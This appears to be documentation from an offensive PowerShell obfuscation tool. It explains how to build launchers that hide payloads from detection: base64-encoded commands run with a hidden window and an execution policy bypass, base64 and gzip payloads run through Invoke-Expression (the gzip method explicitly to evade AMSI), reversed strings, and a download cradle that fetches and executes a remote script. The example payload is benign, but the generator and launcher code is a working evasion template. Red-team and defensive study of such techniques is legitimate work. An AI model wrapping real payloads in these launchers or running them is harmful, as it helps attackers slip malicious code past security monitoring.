# Obfuscation Launchers

Despite the focus of this tool being built around avoiding encapsulation-based launchers for your obfuscation endeavors, there is still an opportunity here for a knowledge transfer on how to build these launchers. You can still achieve various levels of success with these approaches, so long as you introduce obfuscation on these layers and the intended payload. Keep in mind that if your launcher gets flagged, then your intended payload won't matter, so you need an adequate amount of effort on both fronts.

There are many different techniques available, but these are just to get you an idea of some of the more common approaches. 

### Launchers

1. Base64 Encoded Commands
2. Base64 Expressions
3. GZip Compression
4. Payload / String Reversing
5. Download String

## Base64 Encoded Commands

PowerShell supports the ability to execute base64 encoded commands right from the command line with some extra goodies. It also allows you use partial parameter names so long as it's unambiguous, which is a common practice with this launcher. This is arguably the most popular approach and is also one of the easiest to discover when reviewing the logs.

Here is a breakdown of these parameters and what they do:

* -NoP - (-NoProfile) - Does not load the Windows PowerShell profile.)
* -NonI - (-NonInteractive) - Does not present an interactive prompt to the user.
* -W Hidden (-WindowStyle) - Sets the window style to Normal, Minimized, Maximized or Hidden.
* -Exec Bypass (-ExecutionPolicy) - Sets the default execution policy for the current session and saves it
    in the $env:PSExecutionPolicyPreference environment variable.
    This parameter does not change the Windows PowerShell execution policy
    that is set in the registry.
* -Enc (-EncodedCommand) - Accepts a base-64-encoded string version of a command. Use this parameter
    to submit commands to Windows PowerShell that require complex quotation
    marks or curly braces.
    
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/powershell

```powershell
# Generator
$command = 'Write-Output "Try Harder"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$base64 = [Convert]::ToBase64String($bytes)

# Launcher
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAFQAcgB5ACAASABhAHIAZABlAHIAIgAgAA=='
```

## Base64 Expressions

Where the previous scenario allows you to execute base64 encoded payloads from the command line, this approach allows you to execute base64 encoded strings within your script itself. 

https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.1

```powershell
# Generator
$command = 'Write-Output "Try Harder"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$base64 = [Convert]::ToBase64String($bytes)

# Launcher
Invoke-Expression ([System.Text.Encoding]::Unicode.GetString(([convert]::FromBase64String('VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAFQAcgB5ACAASABhAHIAZABlAHIAIgA=
'))))
```

## Gzip Compression

Compression can aid in both evading AMSI (sometimes) and makes it a little tricky to deconstruct. This will take a given payload and compress it into a gzip object then it'll get encoded so it can be stored within the payload. The sneakiness is that you will need to know how to properly decode it or else your payload will be look unintelligible. Keep in mind that not everyone is comfortable with PowerShell so it may not be that straight forward to extract the intended payload.

https://docs.microsoft.com/en-us/dotnet/api/system.io.compression.gzipstream?view=net-5.0

```powershell
# Generator
$command = 'Write-Output "Try Harder"'

## ByteArray
$byteArray = [System.Text.Encoding]::ASCII.GetBytes($command)

## GzipStream
[System.IO.Stream]$memoryStream = New-Object System.IO.MemoryStream
[System.IO.Stream]$gzipStream = New-Object System.IO.Compression.GzipStream $memoryStream, ([System.IO.Compression.CompressionMode]::Compress)
$gzipStream.Write($ByteArray, 0, $ByteArray.Length)
$gzipStream.Close()
$memoryStream.Close()
[byte[]]$gzipStream = $memoryStream.ToArray()

## Stream Encoder
$encodedGzipStream = [System.Convert]::ToBase64String($gzipStream)

## Decoder Encoder
[System.String]$Decoder = '$decoded = [System.Convert]::FromBase64String("<Base64>");$ms = (New-Object System.IO.MemoryStream($decoded,0,$decoded.Length));iex(New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).readtoend()'
[System.String]$Decoder = $Decoder -replace "<Base64>", $encodedGzipStream

# Launcher
$decoded = [System.Convert]::FromBase64String("H4sIAAAAAAAEAAsvyixJ1fUvLSkoLVFQCimqVPBILEpJLVICAGWcSyMZAAAA")
$ms = (New-Object System.IO.MemoryStream($decoded,0,$decoded.Length))
Invoke-Expression (New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()   
```

## Payload / String Reversing

You can reverse virtually anything that can be split into a character array and stored. You'll see this more often with base64 encoded strings, however, you can also store reversed commands within a payload as well.

https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/everything-about-arrays?view=powershell-7.1

```powershell
# Generator
$Command = 'Write-Output "Try Harder"'.ToCharArray()
$Reversed = @()
($Command.length - 1)..0 | ForEach-Object {
    $Reversed += $Command[$_]
}
$Reversed = $Reversed -join ''

# Launcher
$Reversed = '"redraH yrT" tuptuO-etirW'
$Normal = @()
($Reversed.length - 1)..0 | ForEach-Object {
    $Normal += $Reversed[$_]
}
$Normal = $Normal -join ''
Invoke-Expression $($Normal -join '')
```

## Download String

This is an approach you can take when you are launching a payload that is hosted on a website, which helps keeps your payload off your targets disk. Depending on the web server, you may need to enable additional TLS protocols. This can be done by incorporating `[System.Net.ServicePointManager]` and `[System.Net.SecurityProtocolType]` as shown below prior to executing your `System.Net.WebClient` call.


```powershell
# List configured protocols
[Net.ServicePointManager]::SecurityProtocol

# Enable TLSv1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Enable SSLv3.0
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::ssl3

# Enable TLSv1.0, TLSv1.1 and TLSv1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12,[Net.SecurityProtocolType]::Tls11,[Net.SecurityProtocolType]::Tls

# Launcher
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://127.0.0.1/payload.ps1')
```

